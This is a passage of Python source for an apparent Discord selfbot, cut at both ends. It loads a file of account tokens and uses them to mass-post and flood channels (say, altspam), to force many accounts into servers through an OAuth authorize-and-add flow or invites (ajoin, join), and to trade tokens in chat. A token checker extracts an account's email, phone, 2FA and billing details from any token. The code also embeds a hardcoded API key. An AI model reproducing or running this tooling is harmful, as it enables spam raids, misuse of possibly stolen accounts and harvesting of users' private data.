            f"<:discord:1554757014406823988> **LOADED `{loaded_tokens_count}` TOKENS** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"    
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"                      
            f"<:discord_black:1554758471260311612> | **Send Message** **:** **`{prefix}say [msg]`**\n"
            f"<:discord_black:1554758471260311612> | **Oauth Joiner** **:** **`{prefix}ajoin [g_id] [count] <nickname>`**\n"
            f"<:discord_black:1554758471260311612> | **Bot invite link** **:** **`{prefix}invite`**\n"
            f"<:discord_black:1554758471260311612> | **Join Srv/gc** **:** **`{prefix}join [link] [Count]`**\n"
            f"<:discord_black:1554758471260311612> | **Check ALTs** **:** **`{prefix}checkalts`**\n"
            f"<:discord_black:1554758471260311612> | **Give tokens** **:** **`{prefix}givealts [count]`**\n"
            f"<:discord_black:1554758471260311612> | **Add Token** **:** **`{prefix}addalts [tokens]`**\n"
            f"<:discord_black:1554758471260311612> | **Remove Token** **:** **`{prefix}remalt [token]`**\n"
            f"<:discord_black:1554758471260311612> | **Clear Tokens** **:** **`{prefix}clearalts`**\n"
            f"<:discord_black:1554758471260311612> | **Spam Messages** **:** **`{prefix}altspam [chnl_ID]`**\n**`[count][msg]`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"        
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Alt Token Cmds__<a:crown:1554756538445336626>",content)


    @commands.command()
    async def givealts(self, ctx, count: int):
        await ctx.message.delete()
        file_path = "alt_tokens_data/alt_tokens.txt"

        try:
            async with aiofiles.open(file_path, mode="r") as f:
                tokens = await f.readlines()

            tokens = [t.strip() for t in tokens if t.strip()]
            if len(tokens) < count:
                return await ctx.send(f":x: **Not enough tokens available.** Only `{len(tokens)}` left.", delete_after=5)

            confirmation_msg = await ctx.send(f"**Are you sure you want to send `{count}` alt tokens here?**\n-# Reply with `yes` within **30 seconds** to confirm.")

            def check(m):
                return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "yes"

            try:
                reply = await self.bot.wait_for("message", check=check, timeout=30)
                await confirmation_msg.delete()
                await reply.delete()
            except asyncio.TimeoutError:
                await confirmation_msg.delete()
                return await ctx.send(":x: **Token send operation timed out.**", delete_after=5)

            tokens_to_send = tokens[:count]
            remaining_tokens = tokens[count:]

            async with aiofiles.open(file_path, mode="w") as f:
                await f.write("\n".join(remaining_tokens) + "\n")

            token_text = "\n".join(tokens_to_send)

            if len(token_text) <= 1900:
                await ctx.send(token_text)
            else:
                temp_path = f"alt_tokens_data/tokens.txt"
                async with aiofiles.open(temp_path, "w") as f:
                    await f.write(token_text)

                await ctx.send(
                    content=":warning: **Writing limit reached, sending as a `.txt` file instead.**",
                    file=discord.File(temp_path)
                )
                try:
                    os.remove(temp_path)
                except Exception as e:
                    print(f"Failed to delete temp file: {e}")

        except FileNotFoundError:
            await ctx.send(f":x: **The file for tokens does not exist.**", delete_after=5)

    @commands.command(name="say")
    async def say(self, ctx, *, msg: str):
        await ctx.message.delete()
        try:
            with open("alt_tokens_data/alt_tokens.txt", "r") as file:
                tokens = file.read().splitlines()
            if not tokens:
                pass
            headers_template = {
                "Content-Type": "application/json",
                "Authorization": "",
                "User-Agent": "DiscordBot (https://github.com) Python/3.x"
            }
            def send_message_with_token(token):
                token = token.split(":")[2] if "@" in token else token 
                headers = headers_template.copy()
                headers["Authorization"] = token
                payload = {"content": msg}
                url = f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages"
                try:
                    response = requests.post(url, headers=headers, json=payload)
                    if response.status_code == 200:
                        pass
                    else:
                        pass
                except Exception as e:
                    pass
            threads = []
            for token in tokens:
                thread = threading.Thread(target=send_message_with_token, args=(token,))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()
            pass
        except FileNotFoundError:
            pass
        except Exception as e:
            pass

    def exchange_code(self, code):
        try:
            data = {
                'client_id': CLIENT_ID,
                'client_secret': CLIENT_SECRET,
                'grant_type': 'authorization_code',
                'code': code,
                'redirect_uri': REDIRECT_URI
            }
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            r = requests.post(f"{API_ENDPOINT}/oauth2/token", data=data, headers=headers)
            return r.json() if r.ok else False
        except Exception as e:
            print(f"[exchange_code] Error: {e}")
            return False

    def get_user(self, access: str):
        try:
            r = requests.get("https://canary.discord.com/api/v9/users/@me", headers={"Authorization": f"Bearer {access}"})
            data = r.json()
            if isinstance(data, dict) and 'id' in data:
                return data['id']
        except Exception as e:
            print(f"[get_user] Error: {e}")
        return None

    def get_headers(self, token):
        return {
            "Authorization": token,
            "Origin": "https://canary.discord.com",
            "Accept": "*/*",
            "X-Discord-Locale": "en-GB",
            "X-Super-Properties": SUPER_PROPERTIES,
            "User-Agent": USER_AGENT,
            "Referer": "https://canary.discord.com/channels/@me",
            "X-Debug-Options": "bugReporterEnabled",
            "Content-Type": "application/json"
        }


    def authorizer(self, token, guild, nickname):
        try:
            headers = self.get_headers(token)
            r = requests.post(AUTH_URL, headers=headers, json={"authorize": "true"})
            if not r.ok:
                return "fail"

            location = r.json().get("location", "")
            code = location.replace(f"{REDIRECT_URI}?code=", "")
            exchange = self.exchange_code(code)
            if not exchange:
                return "fail"

            access_token = exchange.get("access_token")
            userid = self.get_user(access_token)
            if not userid:
                return "fail"

            self.add_to_guild(access_token, userid, guild)
            if nickname:
                threading.Thread(target=self.rename, args=(token, guild, nickname)).start()

            return "ok"
        except Exception as e:
            print(f"[authorizer] Error: {e}")
            return "fail"

    def rename(self, token, guild, nickname):
        try:
            client = tls_client.Session(client_identifier="firefox_102")
            client.headers.update(self.get_headers(token))
            r = client.patch(
                f"https://canary.discord.com/api/v9/guilds/{guild}/members/@me",
                json={"nick": nickname})
            if r.status_code in (200, 201, 204):    
                return "ok" 
        except Exception as e:
            print(f"[rename] Error: {e}")
            return "error"

    def add_to_guild(self, access_token, userID, guild):
        try:
            url = f"{API_ENDPOINT}/guilds/{guild}/members/{userID}"
            headers = {
                "Authorization": f"Bot {BOT_TOKEN}",
                "Content-Type": "application/json"
            }
            r = requests.put(url=url, headers=headers, json={"access_token": access_token})
            return r.status_code
        except Exception as e:
            return 0

    def main(self, token, guild, nickname=None):
        try:
            joined = 0

            result = self.authorizer(token, guild, nickname)
            if result == "ok":
                joined = 1

            return joined
        except Exception as e:
            return 0

    @commands.command()
    async def ajoin(self,ctx,guild_id:int,num_tokens:int,nickname = None):
        await ctx.message.delete()
        with open("alt_tokens_data/alt_tokens.txt", "r") as file:
            tokens = file.read().splitlines()
        if not tokens:
            await ctx.send("No tokens found in `alt_tokens.txt`.")
            return
        if num_tokens > len(tokens):
            await ctx.send(f"Only `{len(tokens)}` tokens available. Adjusting count to `{len(tokens)}`.")
            num_tokens = len(tokens)
        processing_msg = await send(ctx,"Oauth Joiner",f"**Guild ID:** **`{guild_id}`**\n**Count:** **`{num_tokens}`**\n**Status:** **`Joining...`**")
        selected_tokens = tokens[:num_tokens]
        success_count = 0
        failure_count = 0
        for token in selected_tokens:
            token = token.split(":")[2] if "@" in token else token 
            result = await ctx.bot.loop.run_in_executor(executor, self.main, token, guild_id, nickname)
            if result == 1:
                success_count += 1
            else:
                failure_count += 1
        final_msg = f"> **Guild ID:** `{guild_id}`\n" \
                    f"> **Successful Joins:** `{success_count}`\n" \
                    f"> **Failed Joins:** `{failure_count}`\n" \
                    f"> **Status:** `Join completed.`\n"
        await processing_msg.delete()
        await send(ctx,"Oauth Joiner Results",final_msg)
    @commands.command()
    async def join(self, ctx, invite: str, count: int):
        await ctx.message.delete()
        if "discord.gg" in invite:
            invite = invite.strip().split('/')[-1]
        else:
            invite = invite.strip()
        success_count = 0
        failure_count = 0
        captcha_count = 0
        page_count = 1
        try:
            with open("alt_tokens_data/alt_tokens.txt", "r") as file:
                tokens = file.read().splitlines()
            if not tokens:
                await ctx.send("No tokens found in `alt_tokens.txt`.")
                return
            if count > len(tokens):
                await ctx.send(f"Only `{len(tokens)}` tokens available. Adjusting count to `{len(tokens)}`.")
                count = len(tokens)
            processing_msg = await send(ctx,"Joiner",f"**Invite:** **`{invite}`**\n**Count:** **`{count}`**\n**Status:** **`Joining...`**")
            selected_tokens = tokens[:count]

            for token in selected_tokens:
                token = token.split(":")[2] if "@" in token else token
                result = await self.join_with_token(token, invite, ctx)
                if result:
                    success_count += 1
                else:
                    failure_count += 1

            final_msg = f"> **Invite:** `{invite}`\n" \
                        f"> **Successful Joins:** `{success_count}`\n" \
                        f"> **Failed Joins:** `{failure_count}`\n" \
                        f"> **Status:** `Join completed.`\n"
            await processing_msg.delete()
            await send(ctx,"Joiner Results",final_msg)

        except FileNotFoundError:
            await ctx.send("<:discord_black:1554758471260311612> `alt_tokens.txt` file not found.")

    @commands.command()
    async def checkalts(self, ctx):
        await ctx.message.delete()
        with open("alt_tokens_data/alt_tokens.txt", "r") as file:
            tokens = file.read().splitlines()
        if not tokens:
            await ctx.send("No tokens found in `alt_tokens.txt`.")
            return
        processing_msg = await send(ctx,"ALT Token Checker",f"**Count:** **`{len(tokens)}`**\n**Status:** **`Checking...`**")
        valid_tokens = []
        invalid_tokens = []
        for token in tokens:
            result = await self.check_token(token) 
            if result:
                valid_tokens.append(token)
            else:
                invalid_tokens.append(token)          
        with open("alt_tokens_data/alt_tokens.txt", "w") as file:
            for line in valid_tokens:
                file.write(f"{line}\n")
        with open("alt_tokens_data/invalid_tokens.txt", "w") as file:
            for line in invalid_tokens:
                file.write(f"{line}\n")
        await processing_msg.delete()
        await send(ctx,"ALT Token Checker",f"**Valid Tokens:** **`{len(valid_tokens)}`**\n**Invalid Tokens:** **`{len(invalid_tokens)}`**\n**Status:** **`Check completed.`**")

    @commands.command(aliases=['addalt'])
    async def addalts(self, ctx, *, token: str):
        await ctx.message.delete()
        with open("alt_tokens_data/alt_tokens.txt", "a") as file:
            file.write(f"{token}\n")
        await ctx.send("<:discord_black:1554758471260311612> **Token added successfully.**")

    @commands.command(aliases=['remalts','remalt'])
    async def removealt(self, ctx, *, token: str):
        await ctx.message.delete()
        with open("alt_tokens_data/alt_tokens.txt", "r") as file:
            lines = file.readlines()
        with open("alt_tokens_data/alt_tokens.txt", "w") as file:
            for line in lines:
                if line.strip() != token:
                    file.write(line)
        await ctx.send("<:discord_black:1554758471260311612> **Token removed successfully.**")

    @commands.command()
    async def clearalts(self, ctx):
        await ctx.message.delete()
        with open("alt_tokens_data/alt_tokens.txt", "w") as file:
            file.write("")
        await ctx.send("<:discord_black:1554758471260311612> **ALT tokens cleared successfully.**") 

    @commands.command()
    async def altspam(self, ctx, channel_ID, msg_count: int, *, msg: str):
        await ctx.message.delete()
        try:
            with open("alt_tokens_data/alt_tokens.txt", "r") as file:
                tokens = file.read().splitlines()


            if not tokens:
                await ctx.send("No tokens found in `alt_tokens.txt`.")
                return

            headers_template = {
                "Content-Type": "application/json",
                "Authorization": "",
                "User-Agent": "DiscordBot (https://github.com) Python/3.x"
            }

            async def send_message(token):
                token = token.split(":")[2] if "@" in token else token
                headers = headers_template.copy()
                headers["Authorization"] = token
                payload = {"content": msg}
                url = f"https://discord.com/api/v9/channels/{channel_ID}/messages"

                async with aiohttp.ClientSession() as session:
                    for _ in range(msg_count):
                        try:
                            async with session.post(url, headers=headers, json=payload) as response:
                                if response.status == 200:
                                    pass
                                else:
                                    pass
                        except Exception as e:
                            pass
            def start_tasks():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                tasks = [send_message(token) for token in tokens]
                loop.run_until_complete(asyncio.gather(*tasks))
                loop.close()
            thread = threading.Thread(target=start_tasks)
            thread.start()
            await ctx.send(f"<:arrow:1554766539042062446> Started spamming in channel `{channel_ID}` using {len(tokens)} tokens.")
        except FileNotFoundError:
            await ctx.send("`` file not found.")
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")
    
class check(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def checker(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"              
            f"<:discord:1554757014406823988> **Check Token** **:** **`{prefix}checktoken [token]`**\n"
            f"<:discord:1554757014406823988> **Check IP** **:** **`{prefix}checkip [IP]`**\n"
            f"<:discord:1554757014406823988> **Check Promo** **:** **`{prefix}checkpromo [link]`**\n"
            f"<:discord:1554757014406823988> **Check Phone** **:** **`{prefix}checkph [num]`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Checker Commands__<a:crown:1554756538445336626>", description)


    @commands.command(aliases=['checktoken','tokeninfo'])
    async def tokencheck(self, ctx, token):
        with open("config.json", "r") as config_file:
            config = json.load(config_file)
        TIME_ZONE = config.get("time_zone")
        await ctx.message.delete()
        try:
            token = token.strip().strip('"').strip("'")
            if ":" in token:
                parts = token.split(":")
                token = parts[2].strip() if len(parts) >= 3 and "@" in parts[0] else parts[-1].strip()
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
            }
            data = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)

            if data.status_code == 200:
                j = data.json()
                name = f'{j.get("username", "Unknown")}'
                userid = j.get('id', '0')
                avatar = f"https://cdn.discordapp.com/avatars/{userid}/{j['avatar']}.webp" if j.get('avatar') else "https://cdn.discordapp.com/embed/avatars/0.png"
                phone = j.get('phone', 'N/A')
                isverified = j.get('verified', False)
                email = j.get('email', 'N/A')
                twofa = j.get('mfa_enabled', False)
                flags = j.get('flags', 0)
                utc_time = datetime.utcfromtimestamp(((int(userid) >> 22) + 1420070400000) / 1000)
                local_tz = pytz.timezone(TIME_ZONE)
                creation_date = utc_time.astimezone(local_tz).strftime('%d-%m-%Y %H:%M:%S %Z')

                user_info = (
                    f" <:arrow:1554766539042062446> User: `{name}`\n"
                    f" <:arrow:1554766539042062446> User ID: `{userid}`\n"
                    f" <:arrow:1554766539042062446> Avatar URL: [`{name}'s Avatar`]({avatar})\n"
                    f" <:arrow:1554766539042062446> Phone: `{phone}`\n"
                    f" <:arrow:1554766539042062446> Verified: `{isverified}`\n"
                    f" <:arrow:1554766539042062446> Email: `{email}`\n"
                    f" <:arrow:1554766539042062446> 2FA Enabled: `{twofa}`\n"
                    f" <:arrow:1554766539042062446> Flags: `{flags}`\n"
                    f" <:arrow:1554766539042062446> Account Creation Date: `{creation_date}`"
                )
                await send(ctx, "Token Information", user_info)

                try:
                    nitro_res = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=10)
                    nitro_data = nitro_res.json() if nitro_res.status_code == 200 else []
                except Exception:
                    nitro_data = []

                if isinstance(nitro_data, list) and nitro_data:
                    end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    total_nitro = abs((start - end).days)

                    nitro_info = (
                        f" <:arrow:1554766539042062446> User: `{name}`\n"
                        f" <:arrow:1554766539042062446> Nitro Start Date: `{start}`\n"
                        f" <:arrow:1554766539042062446> Nitro End Date: `{end}`\n"
                        f" <:arrow:1554766539042062446> Total Nitro Days: `{total_nitro}`"
                    )
                    await send(ctx, "Nitro Data", nitro_info)
                else:
                    await send(ctx, "Nitro Data", "No Nitro subscription found for this token.")
            else:
                error_info = (
                    f" <:arrow:1554766539042062446> Invalid token:\n"
                    f" <:arrow:1554766539042062446> Status Code: `{data.status_code}`\n"
                    f" <:arrow:1554766539042062446> Response: `{data.text}`"
                )
                await senderror(ctx, "Error", error_info)
        except Exception as e:
            await senderror(ctx, "Unexpected Error", str(e))

    @commands.command(aliases=['checkip','iplookup','ipinfo'])
    async def ipcheck(self, ctx, ip):
        """Look up information about an IP address."""
        await ctx.message.delete()
        api_key = 'a91c8e0d5897462581c0c923ada079e5'
        api_url = f'https://api.ipgeolocation.io/ipgeo?apiKey={api_key}&ip={ip}'

        response = requests.get(api_url)
        data = response.json()

        if 'country_name' in data:
            country = data['country_name']
            city = data['city']
            isp = data['isp']
            current_time_unix = data['time_zone']['current_time_unix']
            current_time_formatted = f"<t:{int(current_time_unix)}:f>"
            message = (
                f" <:arrow:1554766539042062446> **IP**: **{ip}**\n"
                f" <:arrow:1554766539042062446> **Country**: **{country}**\n"
                f" <:arrow:1554766539042062446> **City**: **{city}**\n"
                f" <:arrow:1554766539042062446> **ISP**: **{isp}**\n"
                f" <:arrow:1554766539042062446> **Current Time**: {current_time_formatted}"
            )

            await send(ctx, "IP Lookup", f"{message}")
        else:
            await senderror(ctx, "Error", "Invalid IP provided.")

    @commands.command(aliases=['promocheck','promoinfo'])
    async def checkpromo(self, ctx, *, promo_links: str):
        await ctx.message.delete()
        links = promo_links.split('\n')
        async with aiohttp.ClientSession() as session:
            for link in links:
                promo_code = self.extract_promo_code(link)
                if promo_code:
                    result = await self.check_promo(session, promo_code)
                    await send(ctx, "Promo Result", result, "10")
                else:
                    await ctx.send(f" <:arrow:1554766539042062446> **Invalid Link**: `{link}`", delete_after=30)

    def extract_promo_code(self, link):
        """Extract promo code from a given link."""
        try:
            return link.strip().split('/')[-1]
        except Exception:
            return None

    async def check_promo(self, session, promo_code):
        """Check the promo code status."""
        url = f'https://ptb.discord.com/api/v10/entitlements/gift-codes/{promo_code}'

        try:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()

                    if data.get("uses") == data.get("max_uses"):
                        return f" <:arrow:1554766539042062446> **Code**: {promo_code}\n**Status**: Already Claimed\n**Title**: `{data.get('promotion', {}).get('inbound_header_text', 'No Title')}`\n**Expiration**: `N/A`"

                    exp_at = data.get("expires_at", None)
                    if exp_at:
                        try:
                            exp_at = exp_at.split(".")[0] 
                            parsed = date_parser.parse(exp_at)
                            now = datetime.utcnow()
                            days_left = abs((now - parsed).days)
                            title = data.get("promotion", {}).get('inbound_header_text', 'No Title')
                            return f" <:arrow:1554766539042062446> **Code**: `{promo_code}`\n**Status**: `Valid`\n**Title**: `{title}`\n**Expires in**: `{days_left}` days"
                        except Exception as e:
                            return f" <:arrow:1554766539042062446> **Code**: `{promo_code}`\n**Status**: `Valid`, but failed to parse expiration date: {str(e)}"
                    else:
                        return f" <:arrow:1554766539042062446> **Code**: `{promo_code}`\n**Status**: `Valid`\n**Expiration**: No expiration date available"

                elif response.status == 429:
                    return f" <:arrow:1554766539042062446> **Code**: `{promo_code}`\n**Status**: `Rate Limited`\nToo many requests, try again later"
                else:
                    return f" <:arrow:1554766539042062446> **Code**: `{promo_code}`\n**Status**: `Invalid`\n**Error**: `{response.status}`"

        except Exception as e:
            return f" <:arrow:1554766539042062446> **Code**: `{promo_code}`\n**Status**: `Error`\n**Message**: `{str(e)}`"

    @commands.command(aliases=['phoneinfo','checkph'])
    async def checkphone(self, ctx, phone_number: str):
        await ctx.message.delete()
        try:
            parsed_number = phonenumbers.parse(phone_number, None)
            
            if not phonenumbers.is_valid_number(parsed_number):
                await ctx.send("The phone number is invalid.")
                return

            country = phonenumbers.region_code_for_number(parsed_number)
            location = geocoder.description_for_number(parsed_number, "en")
            carrier_name = carrier.name_for_number(parsed_number, "en")
            number_type = phonenumbers.number_type(parsed_number)

            type_mapping = {
                phonenumbers.PhoneNumberType.FIXED_LINE: "Fixed Line",
                phonenumbers.PhoneNumberType.MOBILE: "Mobile",
                phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixed Line or Mobile",
                phonenumbers.PhoneNumberType.TOLL_FREE: "Toll-Free",
                phonenumbers.PhoneNumberType.PREMIUM_RATE: "Premium Rate",
                phonenumbers.PhoneNumberType.SHARED_COST: "Shared Cost",
                phonenumbers.PhoneNumberType.VOIP: "VoIP",
                phonenumbers.PhoneNumberType.PERSONAL_NUMBER: "Personal Number",
                phonenumbers.PhoneNumberType.PAGER: "Pager",
                phonenumbers.PhoneNumberType.UAN: "UAN",
                phonenumbers.PhoneNumberType.VOICEMAIL: "Voicemail",
                phonenumbers.PhoneNumberType.UNKNOWN: "Unknown",
            }

            number_type_str = type_mapping.get(number_type, "Unknown")

            message = (
                f" <:arrow:1554766539042062446> **Phone Number:** {phone_number}\n"
                f" <:arrow:1554766539042062446> **Country:** {country or 'Unknown'}\n"
                f" <:arrow:1554766539042062446> **Location:** {location or 'Unknown'}\n"
                f" <:arrow:1554766539042062446> **Carrier:** {carrier_name or 'Unknown'}\n"
                f" <:arrow:1554766539042062446> **Type:** {number_type_str}\n"
            )
            await send(ctx,"Phone NO. result",f"{message}")

        except phonenumbers.NumberParseException:
            await senderror(ctx,"ERROR","Invalid phone number format. Please try again with a valid phone number.")

class settings(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def load_config(self):  
        with open('config.json', 'r') as config_file:
            return json.load(config_file)

    @commands.command()
    async def config(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"                    
            f"<a:hero:1554766032428867584> | **no-prefix mode** **:** **`{prefix}noprefix [enable|disable]`**\n"
            f"<a:hero:1554766032428867584> | **Set prefix** **:** **`{prefix}setprefix [prefix]`**\n"
            f"<a:hero:1554766032428867584> | **ping scan** **:** **`{prefix}pingscan [enable|disable]`**\n"
            f"<a:hero:1554766032428867584> | **Set webhook** **:** **`{prefix}setwebhook [url]`**\n"
            f"<a:hero:1554766032428867584> | **Set Embed Colour** **:** **`{prefix}setcolour [hex_code]`**\n"            
            f"<a:hero:1554766032428867584> | **Change Msg type** **:** **`{prefix}selfmode [text|embed]`**\n"
            f"<a:hero:1554766032428867584> | **Add Alias in cmd** **:** **`{prefix}alias+ [cmd] [alias]`**\n"
            f"<a:hero:1554766032428867584> | **Remove Alias** **:** **`{prefix}alias- [alias]`**\n"
            f"<a:hero:1554766032428867584> | **Stop the bot** **:** **`{prefix}stop`**\n"
            f"<a:hero:1554766032428867584> | **Restart the bot** **:** **`{prefix}restart`**\n"
            f"<a:hero:1554766032428867584> | **Set timezone** **:** **`{prefix}settimezone [timezone]`**\n"
            f"<a:hero:1554766032428867584> | **Check cmd aliases** **:** **`{prefix}checkalias [command]`**\n"
            f"<a:hero:1554766032428867584> | **Check cmd usage** **:** **`{prefix}checkusage [command]`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Config Commands__<a:crown:1554756538445336626>", description)

    @commands.command(name='noprefix', aliases=['np'])
    async def nonprefix(self,ctx, status: str):
        await ctx.message.delete()
        if status.lower() not in ['enable', 'disable']:
            await ctx.send("Usage: `nonprefix <enable|disable>`")
            return
        try:
            with open('config.json', 'r') as config_file:
                config = json.load(config_file)
        except FileNotFoundError:
            await ctx.send("Config.json file not found.","10")
            return
        if status.lower() == 'enable':
            if "prefix" in config:
                del config["prefix"]
            config["prefix"] = ""
            await send(ctx, "Non-prefix", "<:arrow:1554766539042062446> Non-prefix mode enabled.","10")
        elif status.lower() == 'disable':
            if "prefix" in config:
                del config["prefix"]
            config["prefix"] = ","
            await send(ctx, "Non-prefix", "<:arrow:1554766539042062446> Non-prefix mode disabled. Prefix is now set to `\",\"`.\nYou can change it using **`,setprefix <new_prefix` command**","10")
        with open('config.json', 'w') as config_file:
            json.dump(config, config_file, indent=4)

    @commands.command(name='setprefix')
    async def setprefix(self, ctx, new_prefix: str):
        await ctx.message.delete()
        config = self.load_config()
        config['prefix'] = new_prefix
        with open("config.json", 'w') as config_file:
            json.dump(config, config_file, indent=4)
        await send(ctx,"Set prefix",f"<:arrow:1554766539042062446> Prefix has been updated to: `{new_prefix}`","30")

    @commands.command()   
    async def pingscan(self, ctx, option: str):
        await ctx.message.delete()
        if option.lower() not in ['enable', 'disable']:
            await ctx.send("Usage: `pingscan <enable|disable>`",delete_after=10)
            return
        try:
            with open('config.json', 'r') as config_file:
                config = json.load(config_file)
        except FileNotFoundError:
            return
        if option.lower() == 'enable':
            config['ping_scan'] = True
            await send(ctx, "Ping Scan", "<:arrow:1554766539042062446> Ping scan enabled.","10")
        elif option.lower() == 'disable':
            config['ping_scan'] = False
            await send(ctx, "Ping Scan", "<:arrow:1554766539042062446> Ping scan disabled.","10")
        with open('config.json', 'w') as config_file:
            json.dump(config, config_file, indent=4)

    @commands.command()
    async def setwebhook(self, ctx,webhook_url):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        config['webhook_url'] = webhook_url
        with open('config.json', 'w') as config_file:
            json.dump(config, config_file, indent=4)
        await ctx.send("<:arrow:1554766539042062446> Webhook URL has been updated.",delete_after = 30)

    @commands.command()
    async def stop(self, ctx):
        await ctx.message.delete()
        await ctx.send("<:arrow:1554766539042062446> Stopping the bot...")
        await self.bot.close()    

    @commands.command()
    async def setcolour(self, ctx, hex_code: str):
        await ctx.message.delete()
        if not re.fullmatch(r"#[0-9A-Fa-f]{6}", hex_code):
            return await ctx.send("Invalid hex color! Please provide a valid hex code (e.g., #FF5733).")
        with open("config.json", "r") as f:
            config = json.load(f)
        config["embed_colour"] = hex_code
        with open("config.json", "w") as f:
            json.dump(config, f, indent=4)
        await ctx.send(f"<:arrow:1554766539042062446> **Embed Colour for Embed mode updated to {hex_code}!**",delete_after=30)


    @commands.command()
    async def restart(self,ctx):
        await ctx.message.delete()
        await ctx.send("<:arrow:1554766539042062446> Restarting")
        os.execl(sys.executable, sys.executable, *sys.argv)

    @commands.command(aliases=['settz'])
    async def settimezone(self, ctx, time_zone: str):
        await ctx.message.delete()
        try:
            valid_time_zone = pytz.timezone(time_zone)
            formatted_time_zone = ' '.join(word.capitalize() for word in time_zone.split())
            with open('config.json', 'r') as config_file:
                config = json.load(config_file)
            config['time_zone'] = formatted_time_zone
            with open('config.json', 'w') as config_file:
                json.dump(config, config_file, indent=4)
            await send(ctx, "Time Zone", f"<:arrow:1554766539042062446> **Time zone has been updated to `{formatted_time_zone}`.**", "10")
        except pytz.UnknownTimeZoneError:
            await senderror(ctx, "Error", "Invalid time zone. Please provide a valid time zone.")

    @commands.command(aliases=['searchalias','alias','lookalias'])
    async def checkalias(self, ctx, command: str):
        await ctx.message.delete()
        command = self.bot.get_command(command)
        aliases = [command.name] + command.aliases
        alias_message = (
            f"<:arrow:1554766539042062446> **Command :** **`{command.name}`**\n"
            f"<:arrow:1554766539042062446> **Aliases :** {', '.join(f'**`{alias}`**' for alias in aliases)}"
